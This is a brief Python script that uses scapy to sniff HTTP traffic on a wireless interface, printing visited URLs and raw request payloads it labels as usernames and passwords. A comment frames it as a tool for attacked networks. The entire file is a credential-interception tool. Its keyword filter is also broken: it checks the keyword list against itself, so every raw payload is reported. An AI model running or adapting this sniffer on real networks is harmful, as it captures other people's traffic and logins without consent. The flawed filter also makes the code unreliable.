import scapy.all as scapy
from scapy.layers import http

#sniff function
def sniff(interface):
    scapy.sniff(iface=interface, store=False,prn=sniffed_packets)

#URL Visited
def website_visited(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

#credentials scrapping
def credentials_pass(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        user_words = ["username", "user", "login", "password", "pass"]
        for words in user_words:
            if words in user_words:
                return load

#packet information
def sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = website_visited(packet)
        print("Visited Websites and Image urls",url)
        credentials = credentials_pass(packet)
        if credentials:
            print("Usernames and Passwords",credentials)




sniff("wlan0")#here wlan0 is the interface,but it differ from interface that are attacked.
